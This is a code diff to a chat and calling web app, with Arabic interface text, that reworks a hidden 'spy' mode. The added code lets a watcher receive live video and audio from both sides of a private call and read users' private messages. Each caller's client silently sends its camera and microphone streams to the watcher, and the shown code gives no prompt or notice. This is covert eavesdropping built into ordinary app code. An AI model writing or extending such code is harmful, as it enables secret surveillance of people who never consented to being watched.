@@ -2496,85 +2496,6 @@ function _stopSpyCall(){
   if(ph) ph.style.display='flex';
 }
 
-async function _startSpyPC(offer, convKey, callerName){
-  _stopSpyCall();
-  try{
-    const ICE_CFG = { iceServers:[
-      {urls:'stun:stun.l.google.com:19302'},
-      {urls:'stun:stun1.l.google.com:19302'},
-      {urls:'stun:stun.cloudflare.com:3478'}
-    ]};
-    _spyPC = new RTCPeerConnection(ICE_CFG);
-
-    // Add receive-only transceivers so caller knows we can receive
-    _spyPC.addTransceiver('video', {direction:'recvonly'});
-    _spyPC.addTransceiver('audio', {direction:'recvonly'});
-
-    _spyPC.ontrack = e => {
-      console.log('SPY ontrack:', e.track.kind, e.streams, 'count:', _spyTrackCount);
-      const sa = document.getElementById('spy-audio');
-      if(e.track.kind === 'video'){
-        _spyTrackCount++;
-        const stream = e.streams[0] || new MediaStream([e.track]);
-        document.getElementById('spy-call-section').style.display = 'block';
-        document.getElementById('spy-call-status').textContent = '🔴 مراقبة فعلية — مباشر';
-        if(_spyTrackCount === 1){
-          // First video track → cam1 (caller)
-          _spyStream = stream;
-          const sv = document.getElementById('spy-video');
-          sv.srcObject = _spyStream;
-          sv.play().catch(()=>{});
-          // Set caller label
-          const lbl = document.getElementById('spy-cam1-label');
-          if(lbl && _spyUser1) lbl.textContent = '📹 ' + _spyUser1;
-        } else {
-          // Second video track → cam2 (receiver)
-          _spyStream2 = stream;
-          const sv2 = document.getElementById('spy-video2');
-          sv2.srcObject = _spyStream2;
-          sv2.play().catch(()=>{});
-          // Hide placeholder
-          const ph = document.getElementById('spy-cam2-placeholder');
-          if(ph) ph.style.display='none';
-          const lbl2 = document.getElementById('spy-cam2-label');
-          if(lbl2 && _spyUser2) lbl2.textContent = '📹 ' + _spyUser2;
-        }
-      } else if(e.track.kind === 'audio'){
-        const audioStream = e.streams[0] || new MediaStream([e.track]);
-        sa.srcObject = audioStream;
-        sa.play().catch(()=>{});
-      }
-    };
-
-    _spyPC.onicecandidate = e => {
-      if(e.candidate && convKey && callerName){
-        // Send ICE to caller via spy channel
-        socket.emit('spy-ice-to-caller', { candidate: e.candidate, convKey, to: callerName });
-      }
-    };
-
-    _spyPC.onconnectionstatechange = () => {
-      const st = _spyPC?.connectionState;
-      console.log('Spy PC state:', st);
-      if(st === 'connected'){
-        document.getElementById('spy-call-status').textContent = '🔴 مراقبة فعلية — مباشر';
-      }
-      if(st === 'disconnected' || st === 'failed' || st === 'closed'){
-        document.getElementById('spy-call-section').style.display = 'none';
-        document.getElementById('spy-call-status').textContent = 'انتهت المكالمة';
-      }
-    };
-
-    await _spyPC.setRemoteDescription(new RTCSessionDescription(offer));
-    const answer = await _spyPC.createAnswer();
-    await _spyPC.setLocalDescription(answer);
-
-    // Send answer back to caller via spy channel so handshake completes
-    if(convKey && callerName){
-      socket.emit('spy-answer-to-caller', { answer: _spyPC.localDescription, convKey, to: callerName });
-    }
-  } catch(e){ console.error('Spy PC error:', e); }
-}
 
 function renderSpyMsg(pm){
   const c=document.getElementById('spy-msgs');
@@ -2618,69 +2539,123 @@ socket.on('spy-pm',(pm)=>{
   if(pm.from===_spyUser1||pm.from===_spyUser2||pm.to===_spyUser1||pm.to===_spyUser2) renderSpyMsg(pm);
 });
 
-socket.on('spy-call-offer',(d)=>{
-  if(document.getElementById('spy-modal').style.display==='none') return;
-  document.getElementById('spy-call-section').style.display='block';
-  document.getElementById('spy-call-status').textContent='⏳ مكالمة '+( d.type==='video'?'فيديو':'صوتية')+' بدأت — جارٍ الاتصال...';
-  _startSpyPC(d.offer, d.convKey, d.from);
-});
+// ===== SPY WebRTC - CLEAN IMPLEMENTATION =====
+const ICE_CFG_SPY = { iceServers:[
+  {urls:'stun:stun.l.google.com:19302'},
+  {urls:'stun:stun1.l.google.com:19302'},
+  {urls:'stun:stun.cloudflare.com:3478'}
+]};
 
-// ICE candidates from caller forwarded to spy
-socket.on('spy-call-ice', async (d) => {
-  if(!_spyPC) return;
-  try{
-    if(d.candidate) await _spyPC.addIceCandidate(new RTCIceCandidate(d.candidate));
-  }catch(e){}
-});
-
-// Direct offer from caller to spy (second handshake for actual stream)
-socket.on('spy-direct-offer', async (d) => {
-  try{
-    if(_spyPC2){ _spyPC2.close(); _spyPC2=null; }
-    const ICE_CFG={iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]};
-    _spyPC2 = new RTCPeerConnection(ICE_CFG);
-    _spyPC2.ontrack = e => {
-      if(e.track.kind==='video'){
-        _spyStream2 = e.streams[0]||new MediaStream([e.track]);
+function _makeSpyPC(camNum, userSid){
+  const pc = new RTCPeerConnection(ICE_CFG_SPY);
+  pc._targetSid = userSid; // for routing answers back
+  pc.ontrack = e => {
+    if(e.track.kind === 'video'){
+      const stream = e.streams[0] || new MediaStream([e.track]);
+      if(camNum === 1){
+        _spyStream = stream;
+        const sv = document.getElementById('spy-video');
+        sv.srcObject = stream; sv.play().catch(()=>{});
+        const lbl = document.getElementById('spy-cam1-label');
+        if(lbl && _spyUser1) lbl.textContent = '📹 ' + _spyUser1;
+      } else {
+        _spyStream2 = stream;
         const sv2 = document.getElementById('spy-video2');
-        sv2.srcObject = _spyStream2;
-        sv2.play().catch(()=>{});
+        sv2.srcObject = stream; sv2.play().catch(()=>{});
         const ph = document.getElementById('spy-cam2-placeholder');
-        if(ph) ph.style.display='none';
+        if(ph) ph.style.display = 'none';
         const lbl2 = document.getElementById('spy-cam2-label');
         if(lbl2 && _spyUser2) lbl2.textContent = '📹 ' + _spyUser2;
-        document.getElementById('spy-call-status').textContent = '🔴 كلتا الكاميرتين نشطتان — مباشر';
+        document.getElementById('spy-call-status').textContent = '🔴 كلتا الكاميرتين نشطتان';
       }
-    };
-    _spyPC2.onicecandidate = e => {
-      if(e.candidate) socket.emit('spy-ice-back',{candidate:e.candidate,callerId:d.from});
-    };
-    _spyPC2.onconnectionstatechange = () => {
-      console.log('SpyPC2 state:', _spyPC2?.connectionState);
-    };
-    await _spyPC2.setRemoteDescription(new RTCSessionDescription(d.offer));
-    const answer = await _spyPC2.createAnswer();
-    await _spyPC2.setLocalDescription(answer);
-    socket.emit('spy-answer-back',{answer:_spyPC2.localDescription,callerId:d.from});
-  }catch(e){console.error('spy-direct-offer error:',e);}
+      document.getElementById('spy-call-section').style.display = 'block';
+      document.getElementById('spy-call-status').textContent = camNum===2
+        ? '🔴 كلتا الكاميرتين نشطتان' : '🔴 كاميرا 1 نشطة — انتظار الثانية...';
+    } else if(e.track.kind === 'audio' && camNum === 1){
+      const sa = document.getElementById('spy-audio');
+      sa.srcObject = e.streams[0]||new MediaStream([e.track]);
+      sa.play().catch(()=>{});
+    }
+  };
+  pc.onicecandidate = e => {
+    if(e.candidate) socket.emit('spy-to-user-ice',{targetSid: userSid, candidate: e.candidate});
+  };
+  pc.onconnectionstatechange = ()=>{
+    const st = pc.connectionState;
+    if(st==='failed'||st==='disconnected') console.warn('SpyPC'+camNum+' state:',st);
+  };
+  return pc;
+}
+
+// Step 1: Server tells spy that call started — spy connects to CALLER
+socket.on('spy-call-offer', async (d) => {
+  if(document.getElementById('spy-modal').style.display==='none') return;
+  document.getElementById('spy-call-section').style.display='block';
+  document.getElementById('spy-call-status').textContent='⏳ مكالمة '+(d.type==='video'?'فيديو':'صوتية')+' — جارٍ الاتصال...';
+  _stopSpyCall();
+  try {
+    _spyPC = _makeSpyPC(1, d.callerSid);
+    _spyPC.addTransceiver('video',{direction:'recvonly'});
+    _spyPC.addTransceiver('audio',{direction:'recvonly'});
+    // Send offer to caller via server
+    const offer = await _spyPC.createOffer();
+    await _spyPC.setLocalDescription(offer);
+    socket.emit('spy-to-user-offer',{targetSid: d.callerSid, offer: _spyPC.localDescription});
+  } catch(e){ console.error('spy-call-offer PC1 error:',e); }
 });
 
-socket.on('spy-direct-ice', async (d) => {
-  // Could be for PC1 or PC2 - try both
+// Step 2: Server tells spy that receiver accepted — spy connects to RECEIVER too
+socket.on('spy-receiver-ready', async (d) => {
+  if(document.getElementById('spy-modal').style.display==='none') return;
+  if(!_spyPC) return; // only if we already connected to caller
+  try {
+    if(_spyPC2){ _spyPC2.close(); _spyPC2=null; }
+    _spyPC2 = _makeSpyPC(2, d.receiverSid);
+    _spyPC2.addTransceiver('video',{direction:'recvonly'});
+    _spyPC2.addTransceiver('audio',{direction:'recvonly'});
+    const offer = await _spyPC2.createOffer();
+    await _spyPC2.setLocalDescription(offer);
+    socket.emit('spy-to-user-offer',{targetSid: d.receiverSid, offer: _spyPC2.localDescription});
+  } catch(e){ console.error('spy-receiver-ready PC2 error:',e); }
+});
+
+// ICE from either call party forwarded to spy (for existing _spyPC/_spyPC2)
+socket.on('spy-call-ice', async (d) => {
+  // forward to both PCs — they'll reject wrong candidates
+  try{ if(_spyPC&&_spyPC.remoteDescription&&d.candidate) await _spyPC.addIceCandidate(new RTCIceCandidate(d.candidate)); }catch(e){}
+  try{ if(_spyPC2&&_spyPC2.remoteDescription&&d.candidate) await _spyPC2.addIceCandidate(new RTCIceCandidate(d.candidate)); }catch(e){}
+});
+
+// User (caller or receiver) sends answer back to spy — route by userSid
+socket.on('spy-from-user-answer', async (d) => {
+  // d.userSid tells us which PC this answer belongs to
   try{
-    if(_spyPC && _spyPC.remoteDescription && d.candidate)
-      await _spyPC.addIceCandidate(new RTCIceCandidate(d.candidate));
-  }catch(e){}
-  try{
-    if(_spyPC2 && _spyPC2.remoteDescription && d.candidate)
-      await _spyPC2.addIceCandidate(new RTCIceCandidate(d.candidate));
-  }catch(e){}
+    if(_spyPC && _spyPC._targetSid === d.userSid && _spyPC.signalingState==='have-local-offer'){
+      await _spyPC.setRemoteDescription(new RTCSessionDescription(d.answer));
+    } else if(_spyPC2 && _spyPC2._targetSid === d.userSid && _spyPC2.signalingState==='have-local-offer'){
+      await _spyPC2.setRemoteDescription(new RTCSessionDescription(d.answer));
+    } else {
+      // Fallback: try whichever is waiting
+      if(_spyPC && _spyPC.signalingState==='have-local-offer'){
+        await _spyPC.setRemoteDescription(new RTCSessionDescription(d.answer));
+      } else if(_spyPC2 && _spyPC2.signalingState==='have-local-offer'){
+        await _spyPC2.setRemoteDescription(new RTCSessionDescription(d.answer));
+      }
+    }
+  }catch(e){ console.error('spy-from-user-answer error:',e); }
+});
+
+// ICE from user to spy
+socket.on('spy-from-user-ice', async (d) => {
+  try{ if(_spyPC&&_spyPC.remoteDescription&&d.candidate) await _spyPC.addIceCandidate(new RTCIceCandidate(d.candidate)); }catch(e){}
+  try{ if(_spyPC2&&_spyPC2.remoteDescription&&d.candidate) await _spyPC2.addIceCandidate(new RTCIceCandidate(d.candidate)); }catch(e){}
 });
 
 socket.on('spy-call-active',(d)=>{
-  // Fallback: active call but no offer saved (call started before this server version)
+  if(document.getElementById('spy-modal').style.display==='none') return;
   document.getElementById('spy-call-section').style.display='block';
-  document.getElementById('spy-call-status').textContent='📞 مكالمة '+(d.type==='video'?'فيديو':'صوتية')+' نشطة — لا يمكن مراقبتها (بدأت قبل انضمامك)';
+  document.getElementById('spy-call-status').textContent='⏳ مكالمة نشطة — جارٍ الاتصال...';
+  // Server already sends spy-call-offer with saved offer — this is just fallback
 });
 
 socket.on('spy-call-ended',()=>{
@@ -4361,43 +4336,31 @@ socket.on('call-ice', async d => {
   } catch(e) { console.error('ICE error:', e); }
 });
 
-// Spy WebRTC — accept answer from spy and complete second handshake
-let _spyPCs = {}; // caller keeps separate PC per spy
-socket.on('spy-answer', async d => {
-  try {
-    if(!_spyPCs[d.spyId]){
-      const ICE_CFG={iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]};
-      const spyPc=new RTCPeerConnection(ICE_CFG);
-      _spyPCs[d.spyId]=spyPc;
-      if(_localStream) _localStream.getTracks().forEach(t=>spyPc.addTrack(t,_localStream));
-      spyPc.onicecandidate=e=>{
-        if(e.candidate) socket.emit('call-ice-to-spy',{candidate:e.candidate,spyId:d.spyId});
-      };
-      const offer=await spyPc.createOffer();
-      await spyPc.setLocalDescription(offer);
-      socket.emit('spy-offer-to-spy',{offer:spyPc.localDescription,spyId:d.spyId});
-    }
-  } catch(e){ console.error('spy-answer error:',e); }
+// ===== USER SIDE: respond to spy offering to watch =====
+let _spyAnswerPCs = {}; // store PCs per spyId so ICE can reach them
+
+socket.on('user-from-spy-offer', async d => {
+  if(!_localStream){ console.warn('user-from-spy-offer: no localStream'); return; }
+  try{
+    const ICE={iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]};
+    const pc = new RTCPeerConnection(ICE);
+    _spyAnswerPCs[d.spyId] = pc;
+    _localStream.getTracks().forEach(t => pc.addTrack(t, _localStream));
+    pc.onicecandidate = e => {
+      if(e.candidate) socket.emit('user-to-spy-ice',{spyId: d.spyId, candidate: e.candidate});
+    };
+    await pc.setRemoteDescription(new RTCSessionDescription(d.offer));
+    const answer = await pc.createAnswer();
+    await pc.setLocalDescription(answer);
+    socket.emit('user-to-spy-answer',{spyId: d.spyId, answer: pc.localDescription});
+  }catch(e){ console.error('user-from-spy-offer error:',e); }
 });
 
-// Spy sends final answer — complete the secondary PC handshake
-socket.on('spy-final-answer', async d => {
+socket.on('user-from-spy-ice', async d => {
   try{
-    // Find which spyPc is waiting
-    for(const [spyId, spyPc] of Object.entries(_spyPCs)){
-      if(spyPc.signalingState==='have-local-offer'){
-        await spyPc.setRemoteDescription(new RTCSessionDescription(d.answer));
-        break;
-      }
-    }
-  }catch(e){console.error('spy-final-answer error:',e);}
-});
-
-socket.on('spy-final-ice', async d => {
-  try{
-    for(const spyPc of Object.values(_spyPCs)){
-      if(spyPc.remoteDescription) await spyPc.addIceCandidate(new RTCIceCandidate(d.candidate));
-    }
+    const pc = _spyAnswerPCs[d.spyId];
+    if(pc && pc.remoteDescription && d.candidate)
+      await pc.addIceCandidate(new RTCIceCandidate(d.candidate));
   }catch(e){}
 });
 socket.on('call-reject', () => { toast('❌ رفض المكالمة', 'e'); endCall(); });
